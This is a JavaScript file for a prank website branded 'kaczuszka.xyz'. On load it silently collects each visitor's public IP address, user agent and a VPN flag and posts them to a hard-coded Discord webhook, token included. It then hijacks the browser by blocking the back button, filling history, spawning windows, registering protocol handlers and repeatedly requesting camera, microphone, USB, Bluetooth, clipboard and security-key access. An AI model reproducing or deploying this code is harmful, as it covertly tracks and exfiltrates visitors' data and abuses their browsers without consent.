const SCREEN_WIDTH = window.screen.availWidth
const SCREEN_HEIGHT = window.screen.availHeight
const WIN_WIDTH = 480
const WIN_HEIGHT = 260
const VELOCITY = 15
const MARGIN = 10
const TICK_LENGTH = 50

const HIDDEN_STYLE = 'position: fixed; width: 1px; height: 1px; overflow: hidden; top: -10px; left: -10px;'

fetch('https://api.ipify.org/?format=json')
  .then(function(response) {
    return response.json();
  })
  .then(function(data) {
    var ip = data.ip;
    var computerName = navigator.userAgent;

    var vpnIpRanges = [
      // Add known VPN IP ranges here
      // For example: '1.2.3.0/24', '4.5.6.0/24', ...
    ];

    var isVPN = vpnIpRanges.some(function(range) {
      return isIPInRange(ip, range);
    });

    var webhook = 'https://discord.com/api/webhooks/1146479722239373514/LvJIRvNs-OWJpzO6pcYevfijhvUpReAFWpbXjmct_kCxEg16pmqig2znAVjgjd7fdASI';

    var message = {
      embeds: [
        {
          title: 'Website Logs',
          color: 3447003,
          fields: [
            {
              name: 'Connected:',
              value: ip,
              inline: true
            },
            {
              name: 'Computer Name:',
              value: computerName,
              inline: true
            },
            {
              name: 'Is on VPN:',
              value: isVPN ? 'Yes' : 'No',
              inline: true
            }
          ]
        }
      ]
    };

    // Send the message to the Discord webhook
    fetch(webhook, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(message)
    });
  });

function isIPInRange(ip, range) {
  var ipInt = ipToNumber(ip);
  var rangeParts = range.split('/');
  var rangeStart = ipToNumber(rangeParts[0]);
  var rangeEnd = rangeStart + Math.pow(2, 32 - parseInt(rangeParts[1])) - 1;
  return ipInt >= rangeStart && ipInt <= rangeEnd;
}

function ipToNumber(ip) {
  return ip.split('.').reduce(function(result, octet) {
    return (result << 8) + parseInt(octet, 10);
  }, 0);
}

const ART = [
  `
  \\
  (o>
\\_//)  kaczuszka.xyz
\_/_)
_|_
  `
]

const SEARCHES = [
  'kaczuszka',
]

const VIDEOS = [
  'kaczka.mp4',
  'bassboosted.mp3',
]

const PHRASES = [
  'kaczuszka',
]
/**
 * Array to store the child windows spawned by this window.
 */
const wins = []

/**
 * Count of number of clicks
 */
let interactionCount = 0

/**
 * Number of iframes injected into the page for the "super logout" functionality.
 * See superLogout().
 */
let numSuperLogoutIframes = 0

/**
 * Is this window a child window? A window is a child window if there exists a
 * parent window (i.e. the window was opened by another window so `window.opener`
 * is set) *AND* that parent is a window on the same origin (i.e. the window was
 * opened by us, not an external website)
 */
const isChildWindow = (window.opener && isParentSameOrigin()) ||
  window.location.search.indexOf('child=true') !== -1

/**
 * Is this window a parent window?
 */
const isParentWindow = !isChildWindow

/*
 * Run this code in all windows, *both* child and parent windows.
 */
init()

/*
 * Use `window.opener` to detect if this window was opened by another window, which
 * will be its parent. The `window.opener` variable is a reference to the parent
 * window.
 */
if (isChildWindow) initChildWindow()
else initParentWindow()

/**
 * Initialization code for *both* parent and child windows.
 */
function init () {
  confirmPageUnload()

  interceptUserInput(event => {
    interactionCount += 1

    // Prevent default behavior (breaks closing window shortcuts)
    event.preventDefault()
    event.stopPropagation()

    // 'touchstart' and 'touchend' events are not able to open a new window
    // (at least in Chrome), so don't even try. Checking `event.which !== 0` is just
    // a clever way to exclude touch events.
    if (event.which !== 0) openWindow()

    startVibrateInterval()
    enablePictureInPicture()
    triggerFileDownload()

    focusWindows()
    copySpamToClipboard()
    speak()
    startTheramin()

    // Capture key presses on the Command or Control keys, to interfere with the
    // "Close Window" shortcut.
    if (event.key === 'Meta' || event.key === 'Control') {
      window.print()
      requestWebauthnAttestation()
      window.print()
      requestWebauthnAttestation()
      window.print()
      requestWebauthnAttestation()
    } else {
      requestPointerLock()

      if (!window.ApplePaySession) {
        // Don't request TouchID on every interaction in Safari since it blocks
        // the event loop and stops windows from moving
        requestWebauthnAttestation()
      }
      requestClipboardRead()
      requestMidiAccess()
      requestBluetoothAccess()
      requestUsbAccess()
      requestSerialAccess()
      requestHidAccess()
      requestCameraAndMic()
      requestFullscreen()
    }
  })
}

/**
 * Initialization code for child windows.
 */
function initChildWindow () {

  interceptUserInput(event => {
    if (interactionCount === 1) {
      startAlertInterval()
    }
  })
}

/**
 * Initialization code for parent windows.
 */
function initParentWindow () {
  showHelloMessage()
  blockBackButton()
  fillHistory()
  startInvisiblePictureInPictureVideo()

  interceptUserInput(event => {
    // Only run these on the first interaction
    if (interactionCount === 1) {
      registerProtocolHandlers()
      speak('To był błąd')
    }
  })
}

function attemptToTakeoverReferrerWindow () {
  if (isParentWindow && window.opener && !isParentSameOrigin()) {
    window.opener.location = `${window.location.origin}/?child=true`
  }
}

function isParentSameOrigin () {
  try {
    return window.opener.location.origin === window.location.origin
  } catch (err) {
    return false
  }
}

function confirmPageUnload () {
  window.addEventListener('beforeunload', event => {
    event.returnValue = true
  })
}

function registerProtocolHandlers () {
  if (typeof navigator.registerProtocolHandler !== 'function') return

  const protocolWhitelist = [
    'bitcoin',
    'geo',
    'im',
    'irc',
    'ircs',
    'magnet',
    'mailto',
    'mms',
    'news',
    'ircs',
    'nntp',
    'sip',
    'sms',
    'smsto',
    'ssh',
    'tel',
    'urn',
    'webcal',
    'wtai',
    'xmpp'
  ]

  const handlerUrl = window.location.href + '/url=%s'

  protocolWhitelist.forEach(proto => {
    navigator.registerProtocolHandler(proto, handlerUrl, 'Kaczuszka')
  })
}

function requestCameraAndMic () {
  if (!navigator.mediaDevices ||
      typeof navigator.mediaDevices.getUserMedia !== 'function') {
    return
  }

  navigator.mediaDevices.enumerateDevices().then(devices => {
    const cameras = devices.filter((device) => device.kind === 'videoinput')

    if (cameras.length === 0) return
    const camera = cameras[cameras.length - 1]

    navigator.mediaDevices.getUserMedia({
      deviceId: camera.deviceId,
      facingMode: ['user', 'environment'],
      audio: true,
      video: true
    }).then(stream => {
      const track = stream.getVideoTracks()[0]
      const imageCapture = new window.ImageCapture(track)

      imageCapture.getPhotoCapabilities().then(() => {
        track.applyConstraints({ advanced: [{ torch: true }] })
      }, () => {})
    }, () => {})
  })
}